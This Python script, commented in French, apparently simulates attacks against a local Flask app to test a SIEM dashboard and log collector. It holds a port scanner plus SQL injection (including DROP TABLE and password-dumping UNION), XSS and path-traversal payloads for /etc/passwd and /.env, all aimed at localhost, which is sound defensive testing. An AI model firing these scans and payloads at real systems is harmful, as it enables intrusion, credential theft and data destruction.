import socket
import time
import requests
import random

FLASK_TARGET = "http://127.0.0.1:5000"
PORT_COLLECTOR_TARGET = "127.0.0.1"
PORT_COLLECTOR_PORT = 2222

RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

def print_status(attack_name, target):
    print(f"{YELLOW}[*] Lancement de {attack_name} contre {target}...{RESET}")

def run_port_scan():
    print_status("Scan de Ports (T1046)", PORT_COLLECTOR_TARGET)
    # Cibler le collecteur de ports spécifiquement, plus quelques ports aléatoires
    ports_to_scan = [PORT_COLLECTOR_PORT, 80, 443, 21, 22] + [random.randint(1024, 65535) for _ in range(15)]
    
    for port in ports_to_scan:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            if s.connect_ex((PORT_COLLECTOR_TARGET, port)) == 0:
                print(f"    {CYAN}[+] Port {port} est OUVERT{RESET}")
            s.close()
        except Exception:
            pass
        time.sleep(0.05)

def run_sql_injection():
    print_status("Fuzzing d'Injection SQL (T1190)", FLASK_TARGET)
    payloads = [
        "admin' OR 1=1--",
        "UNION SELECT NULL, username, password FROM users",
        "1; DROP TABLE users"
    ]
    
    for payload in payloads:
        # Fuzzing de la page de connexion
        try:
            res = requests.post(f"{FLASK_TARGET}/login", data={"email": payload, "password": "password123"}, timeout=2)
            print(f"    [+] Payload SQLi envoyé : {payload[:30]}... (Statut: {res.status_code})")
        except requests.exceptions.RequestException:
            print(f"    {RED}[!] Cible inaccessible : {FLASK_TARGET}{RESET}")
            break
        time.sleep(0.5)

def run_xss():
    print_status("Fuzzing XSS (T1189)", FLASK_TARGET)
    payloads = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:eval(String.fromCharCode(97,108,101,114,116))"
    ]
    
    for payload in payloads:
        try:
            # On suppose l'existence d'un endpoint de recherche, le logger d'app.py l'interceptera même s'il renvoie 404
            res = requests.get(f"{FLASK_TARGET}/search", params={"q": payload}, timeout=2)
            print(f"    [+] Payload XSS envoyé : {payload[:30]}... (Statut: {res.status_code})")
        except requests.exceptions.RequestException:
            break
        time.sleep(0.5)

def run_path_traversal():
    print_status("Path Traversal / Accès Refusé (T1078)", FLASK_TARGET)
    payloads = [
        "/../../../etc/passwd",
        "/wp-admin/config.php",
        "/.env"
    ]
    
    for payload in payloads:
        try:
            res = requests.get(f"{FLASK_TARGET}{payload}", timeout=2)
            print(f"    [+] Payload Path Traversal envoyé : {payload} (Statut: {res.status_code})")
        except requests.exceptions.RequestException:
            break
        time.sleep(0.5)

def main():
    print("=============================================")
    print(f" {RED} SIMULATEUR D'ATTAQUES RÉSEAU (EN DIRECT){RESET}")
    print("=============================================")
    print("ATTENTION: Ce script génère du vrai trafic réseau.")
    print("Assurez-vous que le Dashboard (app.py) et log_collector.py sont en cours d'exécution.\n")
    time.sleep(2)
    
    # Exécution séquentielle des attaques pour un affichage plus clair
    run_port_scan()
    print("")
    time.sleep(1)
    
    run_sql_injection()
    print("")
    time.sleep(1)
    
    run_xss()
    print("")
    time.sleep(1)
    
    run_path_traversal()
    print("")
    
    print(f"{CYAN}============================================={RESET}")
    print(f"{CYAN} Séquence d'attaques terminée.{RESET}")
    print(f"{CYAN} Vérifiez le Dashboard SIEM et les journaux Watchdog !{RESET}")
    print(f"{CYAN}============================================={RESET}")

if __name__ == "__main__":
    main()
